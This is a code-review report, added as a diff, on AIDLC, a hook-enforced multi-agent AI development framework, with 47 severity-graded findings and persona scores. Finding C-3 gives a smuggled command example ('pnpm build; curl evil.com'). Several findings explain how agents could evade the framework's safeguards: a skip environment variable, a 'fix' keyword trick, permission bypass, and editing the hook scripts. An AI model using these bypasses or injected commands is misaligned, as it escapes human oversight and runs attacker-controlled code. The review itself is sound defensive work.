@@ -1,0 +1,654 @@
+========================================================================
+TWELVE-PERSONA CODE REVIEW — AIDLC Repository
+Date: 2026-04-08
+Reviewer: Claude Opus 4.6 (AI-DLC /five-persona-review)
+Scope: Full AIDLC repository — orchestrator, 10 agents, 30+ hooks,
+       workflow, standards, templates
+========================================================================
+
+REPOSITORY SUMMARY
+------------------
+AIDLC is an orchestrator-based AI development lifecycle framework that
+uses Claude Code's experimental agent teams feature to coordinate 10
+specialized AI agents through a 7-phase pipeline. It separates docs
+(AIDLC repo) from source code (external repo), enforces phase gates
+via 30+ bash hooks across 7 lifecycle events, and produces a
+structured bolt-based artifact trail.
+
+Key stats:
+- 30 hook scripts (~2,910 lines total)
+- 10 agent definitions
+- 760-line WORKFLOW.md
+- 97-line CLAUDE.md orchestrator bootstrap
+- 7 detector plugin directories
+- 4 shared library scripts
+- Standards, templates, and checklists ecosystem
+
+========================================================================
+FINDINGS — 47 total (5 Critical, 11 High, 18 Medium, 13 Low)
+========================================================================
+
+------------------------------------------------------------------------
+CRITICAL FINDINGS (5)
+------------------------------------------------------------------------
+
+C-1 | bypassPermissions on ALL agents — zero trust boundaries
+    | Personas: CTO/Security Architect, Staff Engineer
+    | File: .claude/settings.json (line 7), enforce-permissions.sh
+    |
+    | settings.json sets defaultMode: "bypassPermissions" globally AND
+    | enforce-permissions.sh BLOCKS agents that do NOT use
+    | bypassPermissions. This means every agent — including the
+    | decomposer (which only needs Read/Write/Edit) — gets full Bash(*)
+    | access. The framework actively PREVENTS least-privilege. If any
+    | agent hallucinates a destructive bash command (rm -rf, git push
+    | --force), nothing stops it. The decomposer agent definition even
+    | sets disallowedTools: Bash, but bypassPermissions overrides this
+    | since the runtime permission model is "allow everything."
+    |
+    | RECOMMENDATION: Remove global bypassPermissions. Use per-agent
+    | tool allowlists. At minimum, non-engineering agents should not
+    | have Bash access.
+
+C-2 | bolt-state.sh auto-corrects README.md without git commit
+    | Personas: Data Integrity Guardian, SRE/DevOps
+    | File: .claude/hooks/bolt-state.sh (lines 55-107)
+    |
+    | bolt-state.sh silently rewrites README.md files to "correct"
+    | status drift. This is a side-effect hidden inside what appears
+    | to be a read-only state query. Problems:
+    | (a) Calling bolt-state.sh during hook execution triggers writes
+    |     that are never committed, creating phantom git diffs
+    | (b) Multiple hooks call bolt-state.sh (gate-check, dependency-
+    |     check, inject-bolt-context, verify-bolt-output, integration-
+    |     verify, decisions-check) — each invocation may rewrite files
+    | (c) Auto-correction masks the root cause of drift instead of
+    |     surfacing it for investigation
+    | (d) No audit trail — corrections are logged in JSON output but
+    |     never persisted
+    |
+    | RECOMMENDATION: Separate state reading from state mutation.
+    | bolt-state.sh should be pure-read. Create a separate
+    | fix-drift.sh that the orchestrator calls explicitly with a
+    | git commit afterward.
+
+C-3 | eval of build commands from JSON config — injection risk
+    | Personas: CTO/Security Architect, Framework Specialist
+    | File: .claude/hooks/build-check.sh (line 93),
+    |        auto-checkpoint.sh (line 62),
+    |        verify-bolt-output.sh (line 79)
+    |
+    | Multiple hooks use `eval "$BUILD_CMD"` where BUILD_CMD is read
+    | from project-config.json. If a malicious or malformed config
+    | value is present (e.g., "command": "pnpm build; curl evil.com"),
+    | arbitrary commands execute. The config is user-authored, but in
+    | a multi-user or CI context this is exploitable.
+    |
+    | RECOMMENDATION: Use an allowlist of known build runners
+    | (pnpm, npm, yarn, go, cargo, dotnet) and validate the command
+    | structure before eval. Or use a subprocess array instead of
+    | shell eval.
+
+C-4 | No rollback or recovery on hook-initiated git commits
+    | Personas: SRE/DevOps, Staff Engineer
+    | File: .claude/hooks/auto-checkpoint.sh
+    |
+    | auto-checkpoint.sh commits to git automatically after engineer
+    | agent completion. If the commit includes incorrect changes
+    | (agent produced wrong code that happens to build), there is no
+    | mechanism to roll back. The hook uses `git add -u` which stages
+    | ALL tracked modifications — potentially including unrelated
+    | changes from other concurrent operations. Combined with the
+    | experimental agent teams feature (parallel engineers), this
+    | could commit partial work from one agent mixed with another's
+    | changes.
+    |
+    | RECOMMENDATION: Stage only files the agent actually modified
+    | (track via agent transcript or file watcher). Add a verification
+    | step or at minimum use `git stash` as a safety net.
+
+C-5 | Cascading bolt-state.sh invocations — O(n^2) file reads
+    | Personas: Performance Oracle, SRE/DevOps
+    | File: Multiple hooks calling bolt-state.sh
+    |
+    | Every SubagentStart fires 4 hooks (inject-bolt-context,
+    | require-tech-stack, gate-check, dependency-check). Each calls
+    | bolt-state.sh independently, which reads EVERY bolt's README.md,
+    | code-review.md, qa-results.md, and decisions-needed.md. For a
+    | project with 20 bolts, that's 4 hooks x ~60 file reads = 240
+    | file reads PER AGENT SPAWN. SubagentStop fires 2 more hooks
+    | that also call bolt-state.sh. Engineering team spawn (4 agents)
+    | triggers ~960 file reads just for state checking.
+    |
+    | RECOMMENDATION: Cache bolt-state.sh output in a temp file with
+    | a short TTL (e.g., 10 seconds). Or run it once at the hook
+    | event level and pipe the result to all hooks.
+
+------------------------------------------------------------------------
+HIGH FINDINGS (11)
+------------------------------------------------------------------------
+
+H-1 | AIDLC_SKIP_HOOK environment variable bypasses spec-completeness
+    | Persona: CTO/Security Architect
+    | File: .claude/hooks/spec-completeness.sh (line 18)
+    |
+    | Setting AIDLC_SKIP_HOOK allows any agent to bypass the spec
+    | completeness gate. This env var is not documented, not
+    | restricted, and any agent with Bash access (which is all of
+    | them per C-1) could set it.
+    |
+    | RECOMMENDATION: Remove the skip mechanism or require a
+    | specific file-based override with audit trail.
+
+H-2 | enforce-team-usage.sh bypass via "fix" keyword in prompt
+    | Persona: Pattern Recognition, CTO/Security Architect
+    | File: .claude/hooks/enforce-team-usage.sh (line 20)
+    |
+    | The regex /\b(fix|hotfix|defect|patch|code.review.find|
+    | review.find)\b/ allows solo engineers when the prompt contains
+    | any of these words. The orchestrator (or a prompt injection
+    | scenario) could trivially include "fix" in any prompt to bypass
+    | the TeamCreate requirement. This undermines the entire
+    | multi-agent coordination model.
+    |
+    | RECOMMENDATION: Use a structured flag (e.g., a JSON field
+    | `fix_cycle: true`) rather than keyword matching in free text.
+
+H-3 | Node.js required on every machine — no fallback
+    | Persona: Framework Specialist (Bash/Shell)
+    | File: Every hook script
+    |
+    | All 30 hooks shell out to Node.js for JSON parsing. If Node is
+    | not installed or not in PATH, every hook silently exits 0
+    | (passes). The health-check.sh script checks for node but only
+    | as an informational warning — it never blocks. A system without
+    | Node would have zero enforcement.
+    |
+    | RECOMMENDATION: Make health-check.sh a hard gate that blocks
+    | the orchestrator loop if Node is missing. Consider using jq
+    | as a lighter alternative for simple JSON parsing.
+
+H-4 | update-bolt-status.sh has dual source of truth
+    | Persona: Data Integrity Guardian
+    | File: .claude/hooks/update-bolt-status.sh (lines 142-159)
+    |
+    | This hook updates BOTH README.md AND index.md. Despite
+    | WORKFLOW.md stating "README.md is the SINGLE SOURCE OF TRUTH"
+    | and "index.md is a derived view," the hook independently parses
+    | and rewrites index.md columns using string splitting on pipe
+    | characters. If the index.md table format changes (extra column,
+    | different order), the split-on-pipe logic silently corrupts the
+    | table.
+    |
+    | RECOMMENDATION: Remove index.md updates from this hook. Make
+    | index regeneration a separate, explicit operation that reads
+    | README.md files (the declared source of truth).
+
+H-5 | block-src-writes.sh relies on CLAUDE_AGENT_NAME env var
+    | Persona: CTO/Security Architect
+    | File: .claude/hooks/block-src-writes.sh (line 23)
+    |
+    | If CLAUDE_AGENT_NAME is empty (which happens when the
+    | orchestrator itself runs), the hook allows ALL writes to src/.
+    | This means the orchestrator — which is documented as "never
+    | writes code" — has unrestricted source code access. Any
+    | orchestrator hallucination that writes to src/ is unguarded.
+    |
+    | RECOMMENDATION: When CLAUDE_AGENT_NAME is empty, check if the
+    | caller is the orchestrator and block src writes.
+
+H-6 | No test suite for the hook system
+    | Persona: Test Quality Analyst
+    | File: Entire .claude/hooks/ directory
+    |
+    | 2,910 lines of enforcement logic with zero automated tests.
+    | The hooks are the critical control plane of the entire framework
+    | — they enforce phase gates, block unauthorized operations, and
+    | maintain state. Yet there are no unit tests, no integration
+    | tests, and no CI pipeline that validates hook behavior. The
+    | health-check.sh only verifies syntax and file existence, not
+    | functional correctness.
+    |
+    | RECOMMENDATION: Create a test harness that feeds mock JSON
+    | inputs to each hook and validates exit codes and output. Run
+    | these tests in CI.
+
+H-7 | Compaction recovery overwrites journal without merge
+    | Persona: SRE/DevOps, Data Integrity Guardian
+    | File: .claude/hooks/compaction-recovery.sh (line 141)
+    |
+    | compaction-recovery.sh uses fs.writeFileSync to overwrite the
+    | orchestrator journal. While it preserves "Integration Notes"
+    | and "Engineering Learnings" sections from the existing file,
+    | it drops ALL other custom sections. If the orchestrator or
+    | user added manual notes outside those two sections, they are
+    | silently destroyed on compaction.
+    |
+    | RECOMMENDATION: Preserve the entire existing journal and only
+    | update the sections that compaction-recovery manages. Or append
+    | a timestamped entry instead of overwriting.
+
+H-8 | gate-check.sh still references supply-chain-analyst
+    | Persona: Radical Transparency (docs vs reality)
+    | File: .claude/hooks/gate-check.sh (line 81)
+    |
+    | The gate-check switch statement maps "supply-chain-analyst" to
+    | Phase 3 prerequisites, but AGENTS.md lists supply-chain-analyst
+    | as RETIRED (replaced by Tech Lead impact scan). This dead code
+    | path could confuse future maintainers and indicates the hooks
+    | were not fully updated when the agent roster changed.
+    |
+    | RECOMMENDATION: Remove the supply-chain-analyst case from
+    | gate-check.sh. Audit all hooks for references to retired agents.
+
+H-9 | tech-stack-change.sh listed as PostToolUse but configured as
+    | PreToolUse
+    | Persona: Radical Transparency (docs vs reality)
+    | File: .claude/settings.json (line 38), WORKFLOW.md (line 407)
+    |
+    | WORKFLOW.md says "tech-stack-change.sh PostToolUse hook" but
+    | settings.json configures it under PreToolUse for Edit|Write.
+    | PreToolUse fires BEFORE the write happens, meaning it would
+    | intercept the INTENT to modify tech-stack.yml but cannot capture
+    | the actual diff (the file hasn't changed yet). The documented
+    | behavior ("captures the diff") is impossible with PreToolUse.
+    |
+    | RECOMMENDATION: Move tech-stack-change.sh to PostToolUse (where
+    | it can read the actual diff) or update documentation.
+
+H-10| Two-repo architecture creates split-brain git state
+    | Persona: Architecture Strategist
+    | File: auto-checkpoint.sh (lines 88-114)
+    |
+    | AIDLC docs and source code live in separate git repos. The
+    | auto-checkpoint hook commits to BOTH repos independently. If
+    | one commit succeeds and the other fails (disk full, permission
+    | error), the repos are out of sync with no recovery mechanism.
+    | There is no transaction coordination between the two repos.
+    |
+    | RECOMMENDATION: Add error handling that reverts the first commit
+    | if the second fails. Or use git submodules to keep them
+    | atomically linked.
+
+H-11| Bolt ID extraction uses fragile regex across all hooks
+    | Persona: Pattern Recognition
+    | File: Every hook that extracts BOLT-XXX
+    |
+    | All hooks extract the bolt ID using text.match(/BOLT-\d+/i) on
+    | the agent's prompt or transcript. If the prompt mentions multiple
+    | bolt IDs (e.g., "implement BOLT-005 which depends on BOLT-003"),
+    | it always takes the FIRST match. This is correct most of the
+    | time but fails when dependency context is mentioned before the
+    | target bolt. verify-bolt-output.sh falls back to "most recently
+    | modified bolt directory" which is even more fragile.
+    |
+    | RECOMMENDATION: Pass the target bolt ID as a structured field
+    | in the agent spawn parameters rather than extracting it from
+    | free text.
+
+------------------------------------------------------------------------
+MEDIUM FINDINGS (18)
+------------------------------------------------------------------------
+
+M-1 | Every hook shells out to Node.js via heredoc — startup cost
+    | Persona: Performance Oracle
+    | Most hooks spawn a full Node.js process (sometimes 2-3 per hook)
+    | to parse JSON. At ~100ms per Node spawn, a SubagentStart event
+    | with 6 hooks running 2-3 Node processes each adds 1.2-1.8s of
+    | pure overhead before the agent even starts.
+
+M-2 | WORKFLOW.md is 760 lines — context window pressure
+    | Persona: Cost & Efficiency
+    | The orchestrator reads WORKFLOW.md on every session. At ~760
+    | lines, this consumes significant context. Combined with
+    | CLAUDE.md (97 lines) and AGENTS.md (66 lines), the bootstrap
+    | alone is ~920 lines before any project-specific context.
+
+M-3 | inject-bolt-context.sh loads checklists and mistakes into prompt
+    | Persona: Cost & Efficiency
+    | File: .claude/hooks/inject-bolt-context.sh (lines 163-221)
+    | For engineer agents, the hook reads and injects entire checklist
+    | files and common-mistakes files into the agent prompt. This adds
+    | potentially hundreds of tokens per spawn that may not be relevant
+    | to the specific bolt.
+
+M-4 | verify-wiring.sh uses set -euo pipefail but calls functions that
+    | may return non-zero
+    | Persona: Framework Specialist (Bash/Shell)
+    | File: .claude/hooks/verify-wiring.sh (line 8)
+    | With errexit, if dispatch_detector returns non-zero, the script
+    | exits immediately without running subsequent detectors. This means
+    | a crash in the route-wiring detector skips all other checks.
+
+M-5 | No rate limiting on hook execution
+    | Persona: Performance Oracle
+    | Hooks fire on every tool use. A rapid series of Edit calls (common
+    | during engineering) triggers build-check.sh for each one. The 30s
+    | debounce helps but only after a successful build — failed builds
+    | always trigger immediately.
+
+M-6 | auto-checkpoint.sh regex has quadruple-escaped backslash
+    | Persona: Framework Specialist (Bash/Shell)
+    | File: .claude/hooks/auto-checkpoint.sh (line 75)
+    | The regex /BOLT-\\\\d+/i has 4 backslashes where 2 would suffice.
+    | This will fail to match BOLT-XXX in the transcript, silently
+    | producing commits without bolt IDs in the message.
+
+M-7 | CTO agent runs on Opus — expensive for one-time scaffold
+    | Persona: Cost & Efficiency
+    | The CTO, backend-engineer, frontend-engineer, dba, tech-lead,
+    | and fullstack-designer all run on Opus. For a project with 20
+    | bolts, engineering alone spawns 4 Opus agents per bolt = 80 Opus
+    | invocations. At ~$15-75/M tokens for Opus, a full project run
+    | could cost hundreds of dollars.
+
+M-8 | Product Analyst agent definition not read (not in reading list)
+    | Persona: Radical Transparency
+    | File: .claude/agents/product-analyst.md (not reviewed in detail)
+    | The product-analyst needs WebSearch/WebFetch MCP but the
+    | settings.json MCP allowlist only mentions playwright. If MCP
+    | servers are configured elsewhere, this works, but the coupling
+    | is not obvious from the framework docs alone.
+
+M-9 | Decomposer has disallowedTools: Bash but bypassPermissions
+    | overrides
+    | Persona: Architecture Strategist
+    | File: .claude/agents/decomposer.md (line 6)
+    | The decomposer correctly declares disallowedTools: Bash, but
+    | since enforce-permissions.sh forces bypassPermissions on every
+    | agent spawn, it's unclear whether the agent-level disallowed
+    | override takes effect. This creates confusion about the actual
+    | permission boundary.
+
+M-10| block-conflict-markers.sh only checks staged files
+    | Persona: Data Integrity Guardian
+    | File: .claude/hooks/block-conflict-markers.sh
+    | The hook only scans `git diff --cached` (staged files). Conflict
+    | markers in unstaged files pass through. Since auto-checkpoint.sh
+    | uses `git add -u`, conflict markers in tracked files would be
+    | staged and then caught — but only on the NEXT commit attempt.
+
+M-11| No timeout or circuit breaker on agent spawns
+    | Persona: SRE/DevOps
+    | If an agent enters an infinite loop or gets stuck, there is no
+    | mechanism to kill it after a timeout. The orchestrator must
+    | manually detect and intervene.
+
+M-12| WORKFLOW.md references "Product Owner" in E2E section (line 688)
+    | Persona: Radical Transparency
+    | File: WORKFLOW.md line 688
+    | "Product Owner defines cross-bolt E2E scenarios" — but Product
+    | Owner is listed as RETIRED in AGENTS.md. Should reference
+    | Product Analyst.
+
+M-13| Tech Lead agent still references "supply-chain-analyst" in
+    | coordination section
+    | Persona: Radical Transparency
+    | File: .claude/agents/tech-lead.md (lines 15, 194)
+    | References to supply-chain-analyst coordination persist despite
+    | the agent being retired.
+
+M-14| decisions-check.sh parses severity from section headers, not tags
+    | Persona: Data Integrity Guardian
+    | File: .claude/hooks/decisions-check.sh (lines 72-76)
+    | The hook determines "critical" severity by checking if the
+    | current heading contains "critical" (case insensitive). But the
+    | documented format is `- [ ] [CRITICAL] [Category: type] Desc`.
+    | The hook would miss a CRITICAL item under a non-critical heading.
+
+M-15| verify-bolt-output.sh runs build in source repo on SubagentStop
+    | Persona: Performance Oracle
+    | File: .claude/hooks/verify-bolt-output.sh (lines 76-82)
+    | Running a full build as part of SubagentStop adds significant
+    | latency to every engineer agent completion. This duplicates
+    | build-check.sh which already runs on PostToolUse for edits.
+
+M-16| No health monitoring for the orchestrator loop itself
+    | Persona: SRE/DevOps
+    | The orchestrator loop (WORKFLOW.md lines 476-485) has no circuit
+    | breaker. If bolt-state.sh returns the same bolt repeatedly
+    | (stuck in a loop), there is no detection or automatic escalation.
+
+M-17| Frontend-engineer agent definition not reviewed in full
+    | Persona: Architecture Strategist
+    | Based on the pattern, frontend-engineer likely mirrors
+    | backend-engineer with frontend-specific tools. But the two
+    | agents sharing implementation.md creates write contention in
+    | parallel team execution.
+
+M-18| resolve-paths.sh uses eval on Node output
+    | Persona: CTO/Security Architect
+    | File: .claude/hooks/lib/resolve-paths.sh (line 24)
+    | `eval "$(node -e "...")"` — if the Node script output is
+    | corrupted or contains shell metacharacters, eval would execute
+    | arbitrary commands. The risk is low since the Node script
+    | controls its own output, but eval should be avoided.
+
+------------------------------------------------------------------------
+LOW FINDINGS (13)
+------------------------------------------------------------------------
+
+L-1 | Inconsistent shebang lines: #!/bin/bash vs #!/usr/bin/env bash
+    | Files: Most hooks use #!/bin/bash, some use #!/usr/bin/env bash
+    | Minor portability concern on NixOS/unusual systems.
+
+L-2 | update-bolt-status.sh line 13: `tr '\' '/'` vs `${VAR//\\//}`
+    | Inconsistent path normalization technique across hooks.
+
+L-3 | AGENTS.md table alignment slightly off (cosmetic)
+
+L-4 | No .editorconfig or formatter config for the AIDLC repo itself
+    | The framework enforces code quality standards on projects but
+    | does not apply them to its own hook scripts and markdown.
+
+L-5 | verify-bolt-output.sh double-reads INPUT from both stdin and arg
+    | File: line 31 uses stdin, line 32 uses process.argv[1]
+    | Both reference $INPUT — one is piped, the other is an argument.
+    | Works but is confusing to maintain.
+
+L-6 | WORKFLOW.md numbering skips step 5 in Enhancement pipeline
+    | Line 573: jumps from step 4 to step 6.
+
+L-7 | No CONTRIBUTING.md or developer setup guide for the AIDLC
+    | framework itself
+
+L-8 | Template files reference "supply-chain-analyst" in some places
+    | Carryover from pre-retirement agent roster.
+
+L-9 | No CHANGELOG.md visible in the repository
+
+L-10| design-system-compliance.sh referenced in settings.json but
+    | not read during this review — may have similar patterns to
+    | other hooks
+
+L-11| Multiple hooks create /tmp files without cleanup on error
+    | File: dispatch.sh (line 33) creates stderr_file but cleanup
+    | only happens at line 57 — if the script exits early, temp
+    | files persist.
+
+L-12| WORKFLOW.md "Condensed Context Block" section (line 719) is
+    | partially redundant with inject-bolt-context.sh which already
+    | auto-injects context
+
+L-13| agent-memory directories (.claude/agent-memory/) referenced
+    | but no tooling to read/search memories across agents
+
+========================================================================
+PERSONA SUMMARIES
+========================================================================
+
+1. STAFF ENGINEER (Will Larson)
+   Score: 7/10
+   The hook system is impressively comprehensive — 30 scripts covering
+   phase gates, output verification, branch management, and wiring
+   checks. The code quality is generally solid with consistent
+   patterns. However, the lack of tests for the control plane (H-6),
+   the bolt-state mutation-in-read antipattern (C-2), and the
+   cascading performance issue (C-5) are serious engineering debts.
+   The detector plugin architecture (dispatch.sh + verdict.sh) is
+   well-designed and extensible.
+
+2. FIRST PRINCIPLES (Elon Musk)
+   Score: 6/10
+   The system is over-engineered for the problem it solves. 10 agents
+   and 30+ hooks to produce what is essentially a phased development
+   pipeline. The fundamental question: does agent-level enforcement
+   (hooks that fire on every tool use) justify the overhead vs.
+   orchestrator-level enforcement (check before spawning)? Many hooks
+   duplicate checks the orchestrator should do once. The two-repo
+   architecture adds complexity without clear benefit — a monorepo
+   with directory boundaries would be simpler.
+
+3. RADICAL TRANSPARENCY (Ray Dalio)
+   Score: 6/10
+   Several claims in docs do not match reality:
+   - tech-stack-change.sh documented as PostToolUse but configured
+     as PreToolUse (H-9)
+   - supply-chain-analyst referenced in active code despite being
+     retired (H-8, M-12, M-13)
+   - Product Owner referenced in WORKFLOW.md despite retirement (M-12)
+   - bypassPermissions documented as "permission inheritance" but
+     functionally is "zero permissions enforcement" (C-1)
+   The operational honesty of the status drift prevention system is
+   good — WORKFLOW.md explicitly calls out the "218 out of sync"
+   lesson from a prior system (AIDLS).
+
+4. CTO / SECURITY ARCHITECT
+   Score: 4/10
+   The security posture has fundamental gaps:
+   - bypassPermissions on everything (C-1) — no trust boundaries
+   - eval of user-controlled config values (C-3) — injection risk
+   - AIDLC_SKIP_HOOK bypass (H-1) — undocumented escape hatch
+   - Keyword-based hook bypass (H-2) — trivially circumventable
+   - eval of Node output (M-18) — defense-in-depth violation
+   - No agent can be prevented from modifying AIDLC's own hook
+     scripts (nothing blocks writes to .claude/hooks/)
+   The framework has enforcement depth but enforcement breadth is
+   missing — it guards the workflow but not itself.
+
+5. SRE / DEVOPS
+   Score: 5/10
+   Reliability concerns:
+   - No recovery from failed auto-commits (C-4)
+   - Split-brain two-repo commits (H-10)
+   - No circuit breaker on stuck orchestrator loops (M-16)
+   - No timeout on agent spawns (M-11)
+   - Compaction recovery overwrites without merge (H-7)
+   The compaction-recovery.sh is a genuine innovation — preserving
+   orchestrator state across context window boundaries is a real
+   problem well-addressed. But the write-without-commit pattern in
+   bolt-state.sh (C-2) creates invisible state corruption.
+
+6. PERFORMANCE ORACLE
+   Score: 5/10
+   Hook overhead is the dominant concern:
+   - O(n^2) file reads from cascading bolt-state.sh calls (C-5)
+   - Node.js process spawn per JSON parse (~100ms each) (M-1)
+   - SubagentStart fires 4-6 hooks before the agent runs (M-1)
+   - Duplicate build checks on SubagentStop and PostToolUse (M-15)
+   - No caching of state between hook invocations
+   For a 20-bolt project, the hook overhead per bolt could add
+   5-10 seconds of pure infrastructure latency per agent phase.
+
+7. DATA INTEGRITY GUARDIAN
+   Score: 7/10
+   Strong points: artifact-presence-based phase detection, auto-
+   correction of status drift, multi-hook verification chain. The
+   README.md-as-source-of-truth pattern is sound. Weaknesses:
+   bolt-state.sh mutation in reads (C-2), dual index/README updates
+   (H-4), fragile bolt ID extraction (H-11), and the decisions-check
+   severity parsing mismatch (M-14).
+
+8. ARCHITECTURE STRATEGIST
+   Score: 7/10
+   The overall architecture is coherent: hooks as enforcement layer,
+   agents as execution layer, WORKFLOW.md as the contract, bolt
+   artifacts as the audit trail. The detector plugin system (dispatch
+   + verdict + category-specific detectors) is well-factored. Key
+   weaknesses: the coupling between hooks and bolt-state.sh creates
+   a single point of contention, and the two-repo architecture adds
+   accidental complexity. The agent definitions are excellently
+   structured with clear phase declarations, prerequisites, and
+   output specifications.
+
+9. PATTERN RECOGNITION
+   Score: 7/10
+   Positive patterns: consistent hook structure (cross-platform
+   normalization, early exit on missing config, JSON output format),
+   agent definitions follow a template, fix-retest loop is well-
+   documented. Anti-patterns: God object (bolt-state.sh does too
+   much), keyword-based security bypass (H-2), side-effects in
+   readers (C-2), eval for command execution (C-3).
+
+10. FRAMEWORK SPECIALIST (Bash/Shell)
+    Score: 6/10
+    Strengths: cross-platform path normalization in every hook,
+    proper quoting, consistent use of node for JSON parsing (portable
+    across platforms). Weaknesses: set -euo pipefail used
+    inconsistently (only in verify-wiring.sh), no shellcheck
+    configuration, temp file cleanup gaps (L-11), the quadruple-
+    backslash regex bug (M-6), eval usage (C-3, M-18).
+
+11. TEST QUALITY ANALYST
+    Score: 2/10
+    Zero tests for the framework itself. The hooks are the critical
+    enforcement mechanism — they ARE the framework's value proposition
+    — and they have no automated testing. health-check.sh verifies
+    only file existence and bash syntax, not behavior. There is no
+    CI pipeline visible in the repository. The framework extensively
+    requires test coverage from the projects it manages while having
+    none for itself.
+
+12. COST & EFFICIENCY
+    Score: 5/10
+    Running 10 agents with 6 on Opus per bolt is expensive. A 20-bolt
+    project runs: 20 decomposer (Sonnet) + 20 product-analyst
+    (Sonnet) + 20 fullstack-designer (Opus) + 80 engineering team
+    (4x Opus) + 20 code-reviewer (Sonnet) + 20 qa-engineer (Sonnet)
+    = 180 agent invocations, 100 of which are Opus. The WORKFLOW.md
+    context (760 lines) is read by every agent, adding ~2K tokens
+    per spawn x 180 = ~360K tokens just for workflow context. The
+    hook-injected context (checklists, mistakes, bolt state) adds
+    more. The "intensity" system (Full/Standard/Lean) is a good cost
+    optimization lever — Lean bolts drop to Sonnet for engineering.
+
+========================================================================
+OVERALL ASSESSMENT
+========================================================================
+
+AIDLC is an ambitious and genuinely innovative framework that pushes
+Claude Code's experimental agent teams to their practical limits. The
+hook-based enforcement system, multi-agent coordination model, and
+artifact-driven state management represent real engineering craft.
+
+The core innovation — using bash hooks across 7 lifecycle events to
+enforce a development methodology on AI agents — is powerful and
+largely well-executed. The agent definitions are exceptionally
+detailed, with clear phase declarations, prerequisite checks, and
+output specifications that would reduce agent drift.
+
+However, the framework has significant security and reliability gaps
+that must be addressed before production use:
+
+1. The bypassPermissions-everywhere model (C-1) fundamentally
+   undermines the trust boundaries the framework claims to enforce.
+2. The bolt-state.sh mutation-in-read pattern (C-2) creates invisible
+   state corruption.
+3. The lack of tests for the control plane (H-6) means the
+   enforcement system itself is unverified.
+4. The performance overhead of cascading hook invocations (C-5) will
+   scale poorly.
+
+Compared to lighter-weight approaches (single orchestrator with
+inline checks), AIDLC trades simplicity for depth of enforcement.
+Whether that trade-off is worthwhile depends on the team's tolerance
+for framework overhead vs. the cost of agent errors in production
+codebases.
+
+========================================================================
+VERDICT: 47 findings (5 Critical, 11 High, 18 Medium, 13 Low)
+COMPOSITE SCORE: 5.6/10
+
+Reviewed by: Claude Opus 4.6 (AI-DLC /five-persona-review)
+Co-Authored-By: Claude Opus 4.6 (1M context) <noreply@anthropic.com>
+========================================================================
